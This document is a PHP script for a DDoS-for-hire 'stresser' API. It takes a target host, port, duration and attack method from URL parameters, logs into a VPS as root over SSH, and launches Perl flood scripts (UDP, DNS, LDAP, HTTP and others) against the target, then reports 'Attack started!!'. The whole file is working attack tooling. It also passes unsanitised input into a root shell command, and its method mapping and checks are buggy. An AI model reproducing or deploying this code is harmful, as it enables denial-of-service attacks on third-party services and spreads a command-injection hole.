<?php
ignore_user_abort(true);
set_time_limit(0);
$server_ip = "127.0.0.1"; // Change "127.0.0.1" to your VPS IP
$server_pass = "KEY"; // Change "KEY" to your API Key
$server_user = "root"; // Change if you're using a user other than root
$key = $_GET['key'];
$host = $_GET['host'];
$port = intval($_GET['port']);
$time = intval($_GET['time']);
$size = intval($_GET['size']);
$method = $_GET['method'];
$action = $_GET['action'];
$array = array("DNS", "GAME", "HTTP", "LDAP", "VPN", "UDP", "STOP"); // Add any additional methods here
$ray = array("key12345");
if (!empty($key)){
}else{
die('Error: API key is empty!');}
if (in_array($key, $ray)){ 
}else{
die('Error: Incorrect API key!');}
if (!empty($time)){
}else{
die('Error: time is empty!');}
if (!empty($host)){
}else{
die('Error: Host is empty!');}
if (!empty($method)){
}else{
die('Error: Method is empty!');}
if (in_array($method, $array)){
}else{
die('Error: The method you requested does not exist!');}
if ($port > 44405){
die('Error: Ports over 44405 do not exist');}
if ($time > 2000){
die('Error: Cannot exceed 36000 seconds!');}
if(ctype_digit($Time)){
die('Error: Time is not in numeric form!');}
if(ctype_digit($Port)){
die('Error: Port is not in numeric form!');}
if ($size > 6000){
die('Error: size over 6000 do not exist');}
if ($method == "UDP") { $command = "screen -dm perl /root/UDP.pl $host $port $size $time"; }
if ($method == "GAME") { $command = "screen -dm perl /root/GAME.pl $host $port $size $time"; }
if ($method == "HTTP") { $command = "screen -dm perl HTTP.pl $host $time"; }
if ($method == "GAME") { $command = "screen -dm perl /root/LDAP.pl $host $port $size $time"; }
if ($method == "GAME") { $command = "screen -dm perl /root/VPN.pl $host $port $size $time"; }
if ($method == "GAME") { $command = "screen -dm perl /root/DNS.pl $host $port $size $time"; }
if ($method == "STOP") { $command = "pkill $host -f"; }
if (!function_exists("ssh2_connect")) die("Error: SSH2 does not exist on you're server");
if(!($con = ssh2_connect($server_ip, 22))){
  echo "Error: Connection Issue";
} else {
    if(!ssh2_auth_password($con, $server_user, $server_pass)) {
        echo "Error: Login failed, one or more of you're server credentials are incorect.";
    } else {
        if (!($stream = ssh2_exec($con, $command ))) {
            echo "Error: You're server was not able to execute you're methods file and or its dependencies";
        } else {
            stream_set_blocking($stream, false);
            $data = "";
            while ($buf = fread($stream,4096)) {
                $data .= $buf;
            }
                        echo "Attack started!!</br>Hitting: $host</br>On Port: $port </br>Attack Length: $time</br>With: $method</br>Attack Size: $size";
            fclose($stream);
        }
    }
}
?>